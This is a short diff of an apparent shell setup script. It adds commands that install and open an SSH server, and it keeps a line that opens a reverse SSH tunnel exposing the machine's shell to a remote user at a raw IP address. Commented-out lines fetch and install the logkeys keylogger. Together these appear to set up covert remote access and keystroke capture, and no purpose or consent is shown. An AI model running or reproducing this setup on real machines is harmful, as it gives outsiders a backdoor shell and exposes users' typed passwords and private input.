@@ -1,3 +1,6 @@
+sudo apt update
+sudo apt install openssh-server -y
+sudo ufw allow ssh
 ssh -R 2222:localhost:22 gizmo@75.138.184.49
 #wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
